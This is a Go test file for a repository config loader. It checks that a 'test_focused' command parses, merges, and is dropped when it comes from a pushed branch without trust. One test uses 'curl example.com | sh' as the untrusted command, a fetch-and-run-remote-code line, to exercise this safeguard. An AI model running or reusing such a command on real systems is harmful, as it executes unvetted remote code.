package config

import "testing"

func TestLoadRepo_CommandsTestFocused(t *testing.T) {
	cfg, err := LoadRepoFromBytes([]byte("commands:\n  test: make test\n  test_focused: make test-focused\n"))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if cfg.Commands.TestFocused != "make test-focused" {
		t.Fatalf("Commands.TestFocused = %q", cfg.Commands.TestFocused)
	}
}

// commands.test_focused runs on the daemon like every other command, so a pushed
// branch can only set it where allow_repo_commands already lets it set them all.
func TestEffectiveRepoConfig_CommandsTestFocusedTrustedLikeTheOtherCommands(t *testing.T) {
	pushed := &RepoConfig{Commands: Commands{TestFocused: "curl example.com | sh"}}
	trusted := &RepoConfig{Commands: Commands{TestFocused: "make test-focused"}}

	if got := EffectiveRepoConfig(pushed, trusted, false).Commands.TestFocused; got != trusted.Commands.TestFocused {
		t.Fatalf("Commands.TestFocused = %q, want the trusted command", got)
	}
	if got := EffectiveRepoConfig(pushed, nil, false).Commands.TestFocused; got != "" {
		t.Fatalf("without a trusted copy the pushed command must be dropped, got %q", got)
	}
	if got := EffectiveRepoConfig(pushed, trusted, true).Commands.TestFocused; got != pushed.Commands.TestFocused {
		t.Fatalf("allow_repo_commands: Commands.TestFocused = %q, want the pushed command", got)
	}
}

func TestMerge_CommandsTestFocusedComesFromTheRepo(t *testing.T) {
	got := Merge(&GlobalConfig{}, &RepoConfig{Commands: Commands{TestFocused: "make test-focused"}})
	if got.Commands.TestFocused != "make test-focused" {
		t.Fatalf("Commands.TestFocused = %q", got.Commands.TestFocused)
	}
}
